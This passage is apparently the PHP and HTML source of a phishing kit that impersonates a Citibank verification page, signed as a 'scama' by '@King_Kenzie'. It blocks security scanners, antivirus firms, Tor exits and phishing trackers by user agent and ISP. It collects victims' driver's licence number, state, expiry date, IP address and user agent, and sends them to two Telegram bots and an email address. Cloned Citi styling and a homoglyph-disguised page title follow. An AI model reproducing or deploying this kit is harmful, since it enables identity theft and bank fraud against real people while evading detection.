               "okhttp/2.5.0",
               "ips-agent",
               "scoutjet",
               "UptimeRobot",
               "FM Scene",
               "Prevx",
               "WindowsPowerShell"
          );
              foreach ($Bot as $BotType) {
                  if (stripos($_SERVER['HTTP_USER_AGENT'], $BotType) !== false) {
                      $content = "#> ".$_SERVER['HTTP_USER_AGENT']." [ Bot ] \r\n";
                      $save=fopen("../../bots.txt","a+");
                      fwrite($save,$content);
                      fclose($save);
                      header("HTTP/1.0 404 Not Found");exit();
          
                  }
              }
          
          $ispnya = gethostbyaddr($_SERVER['REMOTE_ADDR']);
          
          $banned_isp = array(
              'Peak 10',
              'Quasi Networks LTD',
              'SC Rusnano',
              'GoDaddy.com, LLC',
              'Server Plan S.r.l.',
              'Linode',
              'Blazing SEO',
              'Lixux OU',
              'Inter Connects Inc',
              'Flokinet Ltd',
              'LukMAN Multimedia Sp. z o.o',
              'PIPEX-BLOCK1',
              'IPVanish',
              'LinkGrid LLC',
              'Snab-Inform Private Enterprise',
              'Cisco Systems',
              'Network and Information Technology Limited',
              'London Wires Ltd.',
              'Tehnologii Budushego LLC',
              'Eonix Corporation',
              'hosttech GmbH',
              'Wowrack.com',
              'SunGard Availability Services LP',
              'Internap Network Services Corporation',
              'Palo Alto Networks',
              'PlusNet Technologies Ltd',
              'Scaleway',
              'Facebook',
              'Host1Plus',
              'XO Communications',
              'Nobis Technology Group',
              'ExpressVPN',
              'DME Hosting LLC',
              'Prescient Software',
              'Sungard Network Solutions',
              'OVH SAS',
              'Iomart Hosting Ltd',
              'Hosting Solution',
              'Barracuda Networks',
              'Sungard Network Solutions',
              'Solar VPS',
              'PHPNET Hosting Services',
              'DigitalOcean',
              'Level 3 Communications',
              'softlayer',
              'Chelyabinsk-Signal LLC',
              'SoftLayer Technologies',
              'Complete Internet Access',
              'london-tor.mooo.com',
              'amazonaws',
              'cyveillance',
              'phishtank',
              'tor.piratenpartei-nrw.de',
              'cpanel66.proisp.no',
              'tor-node.com',
              'dreamhost',
              'Involta',
              'exit0.liskov.tor-relays.net',
              'tor.tocici.com',
              'netpilot',
              'calyxinstitute',
              'tor-exit',
              'msnbot',
              'p3pwgdsn',
              'netcraft',
              'University of Virginia',
              'trendmicro',
              'ebay',
              'paypal',
              'torservers',
              'comodo',
              'EGIHosting',
              'ebbs.healingpathsolutions.com',
              'healingpathsolutions.com',
              'Solution Pro',
              'Zayo Bandwidth',
              'spider.clicktargetdevelopment.com',
              'clicktargetdevelopment.com',
              'static.spro.net',
              'Digital Ocean',
              'Internap Network Services Corporation',
              'Blue Coat Systems',
              'GANDI SAS',
              'roamsite.com',
              'PIPEX-BLOCK1',
              'ColoUp',
              'Westnet',
              'The University of Tokyo',
              'University',
              'University of',
              'QuadraNet',
              'exit-01a.noisetor.net',
              'noisetor.net',
              'noisetor',
              'vultr.com',
              'Zscaler',
              'Choopa',
              'RedSwitches Pty',
              'Quintex Alliance Consulting',
              'www16.mailshell.com',
              'this.is.a.tor.exit-node.net',
              'this.is.a.tor.node.xmission.com',
              'colocrossing.com',
              'DedFiberCo',
              'crawl',
              'sucuri.net',
              'crawler',
              'proxy',
              'enom',
              'cloudflare',
              'yahoo',
              'trustwave',
              'rima-tde.net',
              'tfbnw.net',
              'pacbell.net',
              'tpnet.pl',
              'ovh.net',
              'centralnic',
              'badware',
              'phishing',
              'antivirus',
              'SiteAdvisor',
              'McAfee',
              'Bitdefender',
              'avirasoft',
              'phishtank.com',
              'googleusercontent',
              'OVH SAS',
              'Yahoo',
              'Yahoo! Inc.',
              'Google',
              'Google Inc.',
              'GoDaddy',
              'Amazon Technologies Inc.',
              'Amazon',
              'Top Level Hosting SRL',
              'Twitter',
              'Microsoft',
              'Microsoft Corporation',
              'OVH',
              'VPSmalaysia.com.my',
              'Madgenius.com',
              'Barracuda Networks Inc.',
              'Barracuda',
              'SecuredConnectivity.net',
              'Digital Domain',
              'Hetzner Online',
              'Akamai',
              'SoftLayer',
              'SURFnet',
              'Creative Thought Inc.',
              'Fastly',
              'Return Path Inc.',
              'WhatsApp',
              'Instagram',
              'Schulte Consulting LLC',
              'Universidade Federal do Rio de Janeiro',
              'Sectoor',
              'Bitfolk',
              'DIR A/S',
              'Team Technologies LLC',
              'Mainloop',
              'Junk Email Filter Inc.',
              'Art Matrix - Lightlink Inc.',
              'Redpill Linpro AS',
              'CloudFlare',
              'ESET spol. s r.o.',
              'AVAST Software s.r.o.',
              'Dosarrest',
              'Apple Inc.',
              'Symantec',
              'Mozilla',
              'Netprotect SRL',
              'Host Europe GmbH',
              'Host Sailor Ltd.',
              'PSINet Inc.',
              'Daniel James Austin',
              'RamNode',
              'Hostalia',
              'Xs4all Internet BV',
              'Inktomi Corporation',
              'Eircom Customer Assignment',
              '9New Network Inc',
              'Sony',
              'Private IP Address LAN',
              'Computer Problem Solving',
              'Fortinet',
              'Avira',
              'Rackspace',
              'Baidu',
              'Comodo',
              'Incapsula Inc',
              'Orange Polska Spolka Akcyjna',
              'Infosphere',
              'Private Customer',
              'SurfControl',
              'University of Newcastle upon Tyne',
              'Total Server Solutions',
              'LukMAN',
              'eSecureData',
              'Hosting',
              'VI Na Host Co. Ltd',
              'B2 Net Solutions',
              'Master Internet',
              'Global Perfomance',
              'Fireeye',
              'AntiVirus',
              'Security',
              'Intersoft Internet',
              'Voxility',
              'Linode',
              'Internet-Pro',
              'Trustwave Holdings Inc',
              'Online SAS',
              'Versaweb',
              'Liquid Web',
              'A100 ROW',
              'Apexis AG',
              'Apexis',
              'LogicWeb',
              'Virtual1 Limited',
              'VNET a.s.',
              'Static IP Assignment',
              'TerraTransit AG',
              'Merit Network',
              'PathsConnect',
              'Long Thrive',
              'LG DACOM',
              'Secure Internet',
              'Kaspersky',
              'UK Dedicated Servers Limited',
              'Customer Network',
              'Flokinet',
              'Simpli Networks LLC',
              'Psychz',
              'PrivateSystems Networks',
              'ScanSafe Services',
              'CachedNet',
              'CloudVPN',
              'Spark New Zealand Trading Ltd',
              'Whitelabel IT Solutions Corp',
              'Hostwinds',
              'Hosteros LLC',
              'HostUS',
              'Host',
              'ClientID',
              'Server',
              'Oracle',
              'Fortinet',
              'Unus Inc.',
              'Public facing services',
              'Virtual Employee Pvt Ltd',
              'Dataline Ltd',
              'Teksavvy Solutions Inc.',
              'UPC Romania Bucuresti',
              'TalkTalk Communications Limited',
              'British Telecommunications PLC',
              'Global Data Networks LLC',
              'Quintex Alliance Consulting',
              'Online S.A.S.',
              'Content Delivery Network Ltd',
              'Nobis Technology Group LLC',
              'Parrukatu',
              'JSC ER-Telecom Holding',
              'ChinaNet Fujian Province Network',
              'QualityNetwork',
              'Vist On-Line Ltd',
              'The Calyx Institute',
              'Internet Customers',
              'OJSC Oao Tattelecom',
              'Petersburg Internet Network Ltd.',
              'Psychz Networks',
              'Udasha',
              'Onavo Mobile Ltd',
              'Cubenode System SL',
              'OVH Hosting Inc.',
              'NForce Entertainment B.V.',
              'DigitalOcean LLC',
              'Glenayre Electronics Inc.',
              'British Telecommunications PLC',
              'Iomart Hosting Limited',
              'Digital Energy Technologies Limited',
              'Private Customer',
              'Cisco Systems Inc.',
              'Vultr Holdings LLC',
              'Amazon.com Inc.',
              'Web Hosting Solutions',
              'Time Warner Cable Internet LLC',
              'Internet Security - TC',
              'Vertical Telecoms Broadband Networks and Internet Provider',
              'Ventelo Wholesale',
              'MYX Group LLC',
              'France Telecom S.A.',
              'Online S.A.S.',
              'Nine Internet Solutions AG',
              'Microsoft Azure',
              'Choopa, LLC',
              'Amazon',
              'HighWinds Network',
              'Amazon.com',
              'Bell Canada',
              'Digital Ocean',
              'M247 LTD Frankfurt Infrastructure',
              'Palo Alto Networks',
              'Spectrum',
              'ImOn Communications, LLC',
              'Wintek Corporation',
              'ServerMania',
              'Claro Dominican Republic',
              '013 NetVision',
              'Amazon.com',
              'Digital Ocean',
              'TalkTalk',
              'HostDime.com',
              'AVAST Software s.r.o.',
              'Host1Plus Cloud Servers',
              'Amazon Data Services NoVa',
              'Google Cloud',
              'M-net',
              'Digiweb ltd',
              'Prescient Software',
              'Eir Broadband',
              'Solution Pro',
              'Bell Canada',
              'Linode',
              'DigitalOcean',
              'Plusnet',
              'GigeNET',
              'ZenLayer',
              'NFOrce Entertainment B.V.',
              'NewMedia Express',
              'Telegram Messenger Network',
              'IQ PL Sp. z o.o.',
              'Datacamp Limited',
              'Tahoe Internet Exchange (TahoeIX)',
              'ITCOM Shpk',
              'HEG US'
          
          );
              foreach ($banned_isp as $isps) {
                  if (substr_count($ispnya, $isps) > 0) {
                     $content = "#> ".$_SERVER['HTTP_USER_AGENT']." [ Banned ISP ] \r\n";
                      $save=fopen("../../bots.txt","a+");
                      fwrite($save,$content);
                      fclose($save);
                      header("HTTP/1.0 404 Not Found");exit();
          
                  }
              }
                


           
        
        $_SESSION['dlnum'] = $_POST['dlnum'];
        $_SESSION['dlstate'] = $_POST['dlstate'];
        $_SESSION['dlexpi'] = $_POST['dlexpi'];

        $mess   .= '#---------- Citi DLNUM  ----------------# '.$_SESSION['dlnum']."\n";
        $mess    .= '#---------- Citi dlstate  ----------------# '  .$_SESSION['dlstate']."\n";
        $mess    .= '#---------- Citi dlexpi  ----------------# '  .$_SESSION['dlexpi']."\n";

        $mess   .= '#---------- citi LOGIN IP ----------------# '.$_SESSION['ip']."\n";

        $mess    .= '#---------- citi LOGIN USERAGENT ----------------# ' .$_SERVER['HTTP_USER_AGENT']."\n";
        $mess    .= '#---------- Scama by @King_Kenzie ----------------# '."\n";

        $msg = urlencode($mess);

        // Load bot settings
        include '../admin/settings.php';
        
        // Send to bot 1
        $url1 = "https://api.telegram.org/bot$bot1_token/sendMessage?chat_id=$bot1_chat_id&text=$msg";
        $curl1 = curl_init();
        curl_setopt($curl1, CURLOPT_URL, $url1);
        curl_setopt($curl1, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($curl1, CURLOPT_RETURNTRANSFER, 1);
        $response1 = curl_exec($curl1);
        curl_close($curl1);
        
        // Send to bot 2
        $url2 = "https://api.telegram.org/bot$bot2_token/sendMessage?chat_id=$bot2_chat_id&text=$msg";
        $curl2 = curl_init();
        curl_setopt($curl2, CURLOPT_URL, $url2);
        curl_setopt($curl2, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($curl2, CURLOPT_RETURNTRANSFER, 1);
        $response2 = curl_exec($curl2);
        curl_close($curl2);
        
        // Email (optional)
        $mseg = urldecode($mess);
        $subject = "Citi BY @King_Kenzie From " . $_SESSION['ip'];
        $headers  = "MIME-Version: 1.0\r\n";
        $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
        @mail($webmail, $subject, $mseg, $headers);
        ?>
<html class="cbolui-ddl" lang="en" style="display: block; visibility: visible;" data-inboxsdk-session-id="1617877949639-0.36817867118720415"><head class="at-element-marker"><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">



<style type="text/css">.kampyle_vertical_button .kampyle_button-text {
  font-size: 16px;
  font-family: Arial, Helvetica, sans-serif !important;
  transform: rotate(-180deg) !important;
  font-weight: 500  !important; 
}

@media (max-width: 767px){
.primary-label {
    display: none;
}
}

.kampyle_button-text::before {
  content: "[+]";
  color: #ffffff;
  font-size: 16px;
  font-family: Arial, Helvetica, sans-serif;
  padding-right: 5px
} 

.kampyle_vertical_button .kampyle_button {
  border-radius: 0px 0px 7px 7px!important;
  width: 162px !important;
  min-width: 139px !important;
  min-height: 39px !important;
  z-index: -1;
  text-align: center;
}

.kampyle_vertical_button {
 top: 40%;
 z-index: 1;
 min-height: 39px !important;
 min-width: 139px !important;
}

.kampyle_vertical_button.kampyle_right {
  right: -50px;
}

.footer{
  z-index:  1 !important;
}


#citilmFooter.reskinFooter {
 z-index: 1!important;
}

.site-footer{
  z-index:  99999999 !important;
}


@media (max-width: 991px){
  button.kampyle_vertical_button{
    margin-top: 24px !important;
  }
}

@media (max-width: 480px){
  button.kampyle_vertical_button{
    margin-top: 50px !important;
  }
}
@media print{
	.nebula_image_button,.wcagOutline{
		display: none;
	}
}
</style>
  
  <title> Ꮯіtіbаոk - Ꮩеrіfісаtіоո - Αbοսt Υоս</title>
    
  


  

  
  <link rel="stylesheet" href="assets/stylee.css">
  
<link rel="stylesheet" href="assets/img/origination.css">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="icon" type="image/x-icon" href="assets/img/favicon.ico">
  
  <style>.social[_ngcontent-wwg-c207]{background:#333}.social[_ngcontent-wwg-c207]   .content[_ngcontent-wwg-c207]{width:100%;max-width:1440px;margin:0 auto;padding:20px 6.667%;display:flex;justify-content:space-between}.social[_ngcontent-wwg-c207]   .content[_ngcontent-wwg-c207]   .JDPowerDownloadText[_ngcontent-wwg-c207]{display:none}@media (max-width:990px){.social[_ngcontent-wwg-c207]   .content[_ngcontent-wwg-c207]{width:100%;display:block;margin:0 auto;padding-left:5%;padding-right:5%;padding-bottom:12px}.social[_ngcontent-wwg-c207]   .content[_ngcontent-wwg-c207]   .JDPowerDownloadText[_ngcontent-wwg-c207]{display:block;padding-top:19px}.social[_ngcontent-wwg-c207]   .content[_ngcontent-wwg-c207]   .JDPowerDownloadText[_ngcontent-wwg-c207]   a[_ngcontent-wwg-c207]{font-size:12px;color:#fff;width:288px;height:16px;-ms-grid-row-align:center;align-self:center}}.social[_ngcontent-wwg-c207]   .content[_ngcontent-wwg-c207]   .registerMark[_ngcontent-wwg-c207]{font-size:14px}.social[_ngcontent-wwg-c207]   .content[_ngcontent-wwg-c207]   .socialItems[_ngcontent-wwg-c207]{display:flex;padding-bottom:10px}.social[_ngcontent-wwg-c207]   .content[_ngcontent-wwg-c207]   .socialItems[_ngcontent-wwg-c207]   .JDPowerDownloadText[_ngcontent-wwg-c207]{display:none}.social[_ngcontent-wwg-c207]   .content[_ngcontent-wwg-c207]   .socialItems[_ngcontent-wwg-c207]   div[_ngcontent-wwg-c207]{padding-right:24px}.social[_ngcontent-wwg-c207]   .content[_ngcontent-wwg-c207]   .socialItems[_ngcontent-wwg-c207]   div[_ngcontent-wwg-c207]   button[_ngcontent-wwg-c207]{background:0 0;border:none;padding:0;cursor:pointer}.social[_ngcontent-wwg-c207]   .content[_ngcontent-wwg-c207]   .socialItems[_ngcontent-wwg-c207]   div[_ngcontent-wwg-c207]   .JDContainer[_ngcontent-wwg-c207]{display:flex}.social[_ngcontent-wwg-c207]   .content[_ngcontent-wwg-c207]   .socialItems[_ngcontent-wwg-c207]   div[_ngcontent-wwg-c207]   .JDContainer[_ngcontent-wwg-c207]   button[_ngcontent-wwg-c207]{padding-right:24px}.social[_ngcontent-wwg-c207]   .content[_ngcontent-wwg-c207]   .socialItems[_ngcontent-wwg-c207]   div[_ngcontent-wwg-c207]   .JDContainer[_ngcontent-wwg-c207]   a[_ngcontent-wwg-c207]{font-size:14px;color:#fff;width:361px;height:18px;-ms-grid-row-align:center;align-self:center}.social[_ngcontent-wwg-c207]   .content[_ngcontent-wwg-c207]   .socialItems[_ngcontent-wwg-c207]   div[_ngcontent-wwg-c207]:last-child{padding-right:0}.social[_ngcontent-wwg-c207]   .content[_ngcontent-wwg-c207]   .Appstore[_ngcontent-wwg-c207], .social[_ngcontent-wwg-c207]   .content[_ngcontent-wwg-c207]   .Googleplay[_ngcontent-wwg-c207]{background-image:url(https://online.citi.com/US/ag/citi-branding-assets/images/Appstore-Googleplay-JDPower-Sprite.png);background-repeat:no-repeat;background-size:cover}.social[_ngcontent-wwg-c207]   .content[_ngcontent-wwg-c207]   .facebook[_ngcontent-wwg-c207]{background-image:url(citi-branding-assets/images/social-media_facebook@3x.png);background-repeat:no-repeat;background-size:cover}.social[_ngcontent-wwg-c207]   .content[_ngcontent-wwg-c207]   .twitter[_ngcontent-wwg-c207]{background-image:url(citi-branding-assets/images/social-media_twitter@3x.png);background-repeat:no-repeat;background-size:cover}.social[_ngcontent-wwg-c207]   .content[_ngcontent-wwg-c207]   .Appstore[_ngcontent-wwg-c207]{width:117px;height:40.1px;background-position:0 0}@media (max-width:990px){.social[_ngcontent-wwg-c207]   .content[_ngcontent-wwg-c207]   .socialItems[_ngcontent-wwg-c207]   .JDPowerDownloadText[_ngcontent-wwg-c207]{display:block;padding-top:19px}.social[_ngcontent-wwg-c207]   .content[_ngcontent-wwg-c207]   .socialItems[_ngcontent-wwg-c207]   .JDPowerDownloadText[_ngcontent-wwg-c207]   a[_ngcontent-wwg-c207]{font-size:12px;color:#fff;width:288px;height:16px;-ms-grid-row-align:center;align-self:center}.social[_ngcontent-wwg-c207]   .content[_ngcontent-wwg-c207]   .socialItems[_ngcontent-wwg-c207]   div[_ngcontent-wwg-c207]{padding-right:15px}.social[_ngcontent-wwg-c207]   .content[_ngcontent-wwg-c207]   .socialItems[_ngcontent-wwg-c207]   div[_ngcontent-wwg-c207]   .JDContainer[_ngcontent-wwg-c207]   a[_ngcontent-wwg-c207]{display:none}.social[_ngcontent-wwg-c207]   .content[_ngcontent-wwg-c207]   .Appstore[_ngcontent-wwg-c207]{width:102px;height:36px}}.social[_ngcontent-wwg-c207]   .content[_ngcontent-wwg-c207]   .Googleplay[_ngcontent-wwg-c207]{width:130px;height:40.1px;background-position:0 -45px}@media (max-width:990px){.social[_ngcontent-wwg-c207]   .content[_ngcontent-wwg-c207]   .Googleplay[_ngcontent-wwg-c207]{width:117px;height:36px;background-position:0 -41px}}.social[_ngcontent-wwg-c207]   .content[_ngcontent-wwg-c207]   .JDPowerLogo[_ngcontent-wwg-c207]{width:40px;height:40.1px}@media (max-width:990px){.social[_ngcontent-wwg-c207]   .content[_ngcontent-wwg-c207]   .JDPowerLogo[_ngcontent-wwg-c207]{width:35.6px;height:36px;margin-right:0}}.social[_ngcontent-wwg-c207]   .content[_ngcontent-wwg-c207]   .facebook[_ngcontent-wwg-c207]{width:9px;height:16px}.social[_ngcontent-wwg-c207]   .content[_ngcontent-wwg-c207]   .twitter[_ngcontent-wwg-c207]{width:22px;height:16px}.social[_ngcontent-wwg-c207]   .content[_ngcontent-wwg-c207]   .youtube[_ngcontent-wwg-c207]{background-image:url(citi-branding-assets/images/social-media_youtube@3x.png);background-repeat:no-repeat;background-size:cover;width:24px;height:16px}</style>
  
  <style>.disclaimer[_ngcontent-wwg-c206]{background:#333;padding-bottom:12px}.disclaimer[_ngcontent-wwg-c206]   .content[_ngcontent-wwg-c206]{width:100%;max-width:1440px;margin:0 auto;padding:0 6.667%}@media (max-width:990px){.disclaimer[_ngcontent-wwg-c206]   .content[_ngcontent-wwg-c206]{padding:0 5%}}.disclaimer[_ngcontent-wwg-c206]   .content[_ngcontent-wwg-c206]     h4{font-family:Interstate_Bold,sans-serif;font-size:12px;color:#fff;line-height:16px}.disclaimer[_ngcontent-wwg-c206]   .content[_ngcontent-wwg-c206]     a, .disclaimer[_ngcontent-wwg-c206]   .content[_ngcontent-wwg-c206]     p{font-family:Interstate_Light,sans-serif;font-size:12px;color:#f4f4f4;letter-spacing:0;line-height:18px}.disclaimer[_ngcontent-wwg-c206]   .content[_ngcontent-wwg-c206]   .text[_ngcontent-wwg-c206]{font-size:12px;color:#fff}.disclaimer[_ngcontent-wwg-c206]   .content[_ngcontent-wwg-c206]   .text[_ngcontent-wwg-c206]   p[_ngcontent-wwg-c206]{max-height:100%}.disclaimer[_ngcontent-wwg-c206]   .content[_ngcontent-wwg-c206]   .text[_ngcontent-wwg-c206]   p[_ngcontent-wwg-c206]:last-child{margin-bottom:0}.disclaimer[_ngcontent-wwg-c206]   .content[_ngcontent-wwg-c206]   .text[_ngcontent-wwg-c206]   a[_ngcontent-wwg-c206]{color:#fff}</style>
  
  
  <style>
    html {
      display: none;
      visibility: hidden;
    }
  </style>

  <style>
    .jamp.preload {
      display: -ms-flexbox;
      display: -webkit-flex;
      display: flex;
      -webkit-justify-content: center;
      -ms-flex-pack: center;
      justify-content: center;
      -webkit-align-items: center;
      -ms-flex-align: center;
      align-items: center;

      width: 100%;
      height: 100%;
      position: absolute;
      top: 0px;
      left: 0px;
      margin: 0;
    }

    @keyframes spinner {
      to {
        transform: rotate(360deg);
      }
    }

    .jamp.preload .loading {
      background-image: url(assets/img/download.svg);
      -webkit-animation: spinner 1160ms infinite linear;
      animation: spinner 1160ms infinite linear;
    }

    .jamp.preload .img {
      background-position: 0 0;
      background-repeat: no-repeat;
      background-size: contain;
      margin-right: 3px;
      width: 30px;
      height: 30px;
      display: inline-block;
    }

  </style>
<style></style><style>.mfa-screen-alignment[_ngcontent-ekd-c197]{margin-left:20px!important}</style><style>.citi-container[_ngcontent-ekd-c247]{padding:40px 20px 0;max-width:1440px;margin:0 auto;min-height:650px}.fullbleedFix[_ngcontent-ekd-c247]{margin:0;padding:0;max-width:100%}[_nghost-ekd-c247]     .fullbleedFix .row{margin-left:0;margin-right:0}.citi-panel-wrapper[_ngcontent-ekd-c247]{display:flex}.citi-panel-wrapper[_ngcontent-ekd-c247]   .content-panel[_ngcontent-ekd-c247]{flex:3 0 0}.citi-panel-wrapper[_ngcontent-ekd-c247]   .search-panel[_ngcontent-ekd-c247]{flex:1 0 0;border-left:1px solid #d6d6d6;background-color:#fff}@media screen and (max-width:991.9px){.citi-panel-wrapper[_ngcontent-ekd-c247]   .search-panel[_ngcontent-ekd-c247]{background-color:#fff!important}.citi-panel-wrapper[_ngcontent-ekd-c247]   .content-panel[_ngcontent-ekd-c247]{display:none}}@media screen and (max-width:768px){.citi-panel-wrapper[_ngcontent-ekd-c247]   .search-panel[_ngcontent-ekd-c247]{position:absolute;top:0;left:0;width:100%;height:100%;z-index:100000!important;background-color:#fff!important}.citi-panel-wrapper[_ngcontent-ekd-c247]   .content-panel[_ngcontent-ekd-c247]{display:none}}</style><style>.ivr-cta-wrapper[_ngcontent-ekd-c278]{text-align:right}.citi-bot[_ngcontent-ekd-c278]{height:100%;width:100%;background:#0e2a48;text-align:start;border-radius:8px;padding:16px;display:-ms-grid;display:grid;-ms-grid-columns:auto 1fr auto;grid-template-columns:auto 1fr auto;align-items:center;border:none}.citi-bot-header[_ngcontent-ekd-c278]{color:#fff;font-family:interstate_Bold;margin:8px;padding:0 16px}.citi-bot-content[_ngcontent-ekd-c278]{color:#eee;margin:8px;padding:0 16px;line-height:120%}citi-icon2[_ngcontent-ekd-c278]     svg path{fill:#00bdf2}.citi-bot-link[_ngcontent-ekd-c278]{font-family:interstate_Bold;color:#00bdf2;margin:0}.citi-bot-link-container[_ngcontent-ekd-c278]{display:flex;justify-content:flex-end;flex-direction:row;align-items:center}.citi-bot-link-container[_ngcontent-ekd-c278]   citi-icon2[_ngcontent-ekd-c278]     svg>path{stroke-width:3;stroke:#00bdf2}@media (max-width:767px){  #ivr-modal .header-level-2{line-height:2rem}}@media (max-width:991px){.ivr-cta-wrapper[_ngcontent-ekd-c278]{text-align:center}.citi-bot[_ngcontent-ekd-c278]{text-align:center;display:block}.citi-bot-header[_ngcontent-ekd-c278]{margin-top:0}.citi-bot-content[_ngcontent-ekd-c278]{padding:0}.citi-bot-link-container[_ngcontent-ekd-c278]{display:flex;justify-content:center;align-items:center}}.citi-bot[_ngcontent-ekd-c278]:hover{cursor:pointer}.citi-bot-divider[_ngcontent-ekd-c278]{border-top:1.5px solid #666;opacity:25%;margin-bottom:16px}.citi-bot-divider-container[_ngcontent-ekd-c278]{margin-top:42px}</style><style>.ivr-modal-container .ivr-cta-wrapper{text-align:right;justify-content:flex-end;margin:8px}  .ivr-modal-container .ivr-cta-wrapper .cds-cta{margin:8px;padding:13px 0}  .ivr-modal-container .ivr-cta-wrapper button{text-align:center}  .ivr-modal-container p{margin:0}  .ivr-modal-container .cds-modal-footer{justify-content:flex-end}  .ivr-modal-container .dropdown{padding:8px}  .ivr-modal-container .citi-bot{height:100%;width:100%;background:#0e2a48;text-align:start;border-radius:8px;padding:16px;display:-ms-grid;display:grid;-ms-grid-columns:auto 1fr auto;grid-template-columns:auto 1fr auto;align-items:center;border:none}  .ivr-modal-container .citi-bot-header{color:#fff;font-family:interstate_Bold;margin:8px;padding:0 16px}  .ivr-modal-container .citi-bot-content{color:#eee;margin:8px;padding:0 16px;line-height:120%}  .ivr-modal-container cds-icon svg>path{fill:#00bdf2}  .ivr-modal-container .citi-bot-link{font-family:interstate_Bold;color:#00bdf2;margin:0}  .ivr-modal-container .citi-bot-link-container{display:flex;justify-content:flex-end;flex-direction:row;align-items:center}  .ivr-modal-container .citi-bot-link-container cds-icon svg>path{stroke-width:3;stroke:#00bdf2}  .cdk-overlay-container{z-index:10002}@media (max-width:1167px){.ivr-cta-wrapper[_ngcontent-ekd-c279]{text-align:center;justify-content:center}.citi-bot[_ngcontent-ekd-c279]{text-align:center;display:block}.citi-bot-header[_ngcontent-ekd-c279]{margin-top:0}.citi-bot-content[_ngcontent-ekd-c279]{padding:0}.citi-bot-link-container[_ngcontent-ekd-c279]{display:flex;justify-content:center;align-items:center}.cds-modal-footer[_ngcontent-ekd-c279]{justify-content:center}}.citi-bot[_ngcontent-ekd-c279]:hover{cursor:pointer}.citi-bot-divider[_ngcontent-ekd-c279]{border-top:1.5px solid #666;opacity:25%;margin-bottom:16px}</style><style>.modal.in{z-index:9999999999!important}  .citi-modal-backdrop{z-index:999999999!important}</style><style>[_nghost-ekd-c244]     citi-input .form-group{padding-left:0;padding-right:0}[_nghost-ekd-c244]     citi-modal div .citi-modal-box .citi-modal-close{padding-top:5px!important}[_nghost-ekd-c244]     citi-modal div .citi-modal-box .citi-modal-controls{padding-top:0!important;padding-bottom:10px!important}</style><style>.primary[_ngcontent-ekd-c206]{box-shadow:0 1px 5px rgba(0,0,0,.125);position:relative;z-index:9999}.alternateSkipNav[_ngcontent-ekd-c206]{position:absolute;transform:translateY(-100%);padding:3px}.alternateSkipNav[_ngcontent-ekd-c206]:focus{transform:translateY(0);position:relative!important}.coBranding[_ngcontent-ekd-c206]{max-width:1440px;margin:0 auto}</style><style>[_nghost-ekd-c209]     .brandingSprite{background-image:url(citi-branding-assets/images/Citi-Branding-Sprite.png)!important;background-repeat:no-repeat;cursor:pointer;display:inline-block}[_nghost-ekd-c209]     .brandingSprite .equalHousing, [_nghost-ekd-c209]     .brandingSprite .fdic{cursor:default!important}[_nghost-ekd-c209]     .footer{position:initial;background:#333}citi-social-media[_ngcontent-ekd-c209]     .social .content .socialItems citi-modal   .modal .modal-dialog{margin:40px auto!important}citi-social-media[_ngcontent-ekd-c209]     .social .content .socialItems citi-modal   .modal .modal-dialog .modal-content .modal-header{padding:15px!important;min-height:16.5px}citi-social-media[_ngcontent-ekd-c209]     .social .content .socialItems citi-modal   .modal .modal-dialog .modal-content .modal-body{padding-right:40px;padding-left:40px}citi-social-media[_ngcontent-ekd-c209]     .social .content .socialItems citi-modal   .modal .modal-dialog .modal-content .modal-footer{padding:40px 15px 15px!important;text-align:right;border-top:1px solid #e5e5e5;width:100%;border:none!important}citi-social-media[_ngcontent-ekd-c209]     .social .content .socialItems citi-modal   .modal .modal-dialog .modal-content .modal-footer citi-cta   a{color:#fff;background:#056dae;margin:20px 20px 0 0;min-width:220px;position:relative;line-height:34px;vertical-align:middle;text-align:center;font-size:1rem;font-family:Interstate_Bold,sans-serif;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;font-weight:700;border-radius:6px;display:inline-block;touch-action:manipulation;cursor:pointer;border:2px solid #056dae;white-space:nowrap;padding:6px 20px;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}@media screen and (max-width:800px){#nebula_div_btn[_ngcontent-ekd-c209]{display:none}}</style><style>a[_ngcontent-ekd-c207], abbr[_ngcontent-ekd-c207], acronym[_ngcontent-ekd-c207], address[_ngcontent-ekd-c207], applet[_ngcontent-ekd-c207], article[_ngcontent-ekd-c207], aside[_ngcontent-ekd-c207], audio[_ngcontent-ekd-c207], b[_ngcontent-ekd-c207], big[_ngcontent-ekd-c207], blockquote[_ngcontent-ekd-c207], body[_ngcontent-ekd-c207], canvas[_ngcontent-ekd-c207], caption[_ngcontent-ekd-c207], center[_ngcontent-ekd-c207], cite[_ngcontent-ekd-c207], code[_ngcontent-ekd-c207], dd[_ngcontent-ekd-c207], del[_ngcontent-ekd-c207], details[_ngcontent-ekd-c207], dfn[_ngcontent-ekd-c207], div[_ngcontent-ekd-c207], dl[_ngcontent-ekd-c207], dt[_ngcontent-ekd-c207], em[_ngcontent-ekd-c207], embed[_ngcontent-ekd-c207], fieldset[_ngcontent-ekd-c207], figcaption[_ngcontent-ekd-c207], figure[_ngcontent-ekd-c207], footer[_ngcontent-ekd-c207], form[_ngcontent-ekd-c207], h1[_ngcontent-ekd-c207], h2[_ngcontent-ekd-c207], h3[_ngcontent-ekd-c207], h4[_ngcontent-ekd-c207], h5[_ngcontent-ekd-c207], h6[_ngcontent-ekd-c207], header[_ngcontent-ekd-c207], hgroup[_ngcontent-ekd-c207], html[_ngcontent-ekd-c207], i[_ngcontent-ekd-c207], iframe[_ngcontent-ekd-c207], img[_ngcontent-ekd-c207], ins[_ngcontent-ekd-c207], kbd[_ngcontent-ekd-c207], label[_ngcontent-ekd-c207], legend[_ngcontent-ekd-c207], li[_ngcontent-ekd-c207], mark[_ngcontent-ekd-c207], menu[_ngcontent-ekd-c207], nav[_ngcontent-ekd-c207], object[_ngcontent-ekd-c207], ol[_ngcontent-ekd-c207], output[_ngcontent-ekd-c207], p[_ngcontent-ekd-c207], pre[_ngcontent-ekd-c207], q[_ngcontent-ekd-c207], ruby[_ngcontent-ekd-c207], s[_ngcontent-ekd-c207], samp[_ngcontent-ekd-c207], section[_ngcontent-ekd-c207], small[_ngcontent-ekd-c207], span[_ngcontent-ekd-c207], strike[_ngcontent-ekd-c207], strong[_ngcontent-ekd-c207], sub[_ngcontent-ekd-c207], summary[_ngcontent-ekd-c207], 